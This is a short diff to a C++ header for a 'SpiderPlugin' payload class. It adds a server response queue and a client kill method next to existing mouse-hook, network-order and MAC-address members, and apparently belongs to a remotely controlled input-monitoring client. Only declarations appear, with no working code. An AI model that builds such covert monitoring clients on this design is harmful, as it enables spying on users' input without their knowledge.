@@ -29,6 +29,9 @@ class SpiderPlugin : public IPayload
     // Get the event thread-safe queue, in order to control the client
     virtual mt::Queue<Order> &getOrderQueue();
 
+    // Get the message thread-safe queue, in order to response to the server
+    virtual mt::Queue<std::string> &getReponseQueue();
+
     // Should de-initialize the payload, if needed
     virtual bool deinit();
 
@@ -40,6 +43,9 @@ class SpiderPlugin : public IPayload
 
     // Toggle Mouse hook
     virtual bool getMouse();
+
+    // Kill the client
+    virtual bool kill();
 
     // Execute all the actions needed
     virtual void run();
@@ -102,6 +108,7 @@ class SpiderPlugin : public IPayload
 
     static mt::Queue<SystemMsg> *m_sendToNetwork;
     mt::Queue<Order> m_receivedFromNetwork;
+    mt::Queue<std::string> m_networkResponseQueue;
     static std::string m_macAddr;
 
     std::map<std::string, std::function<void()>> m_cmd;
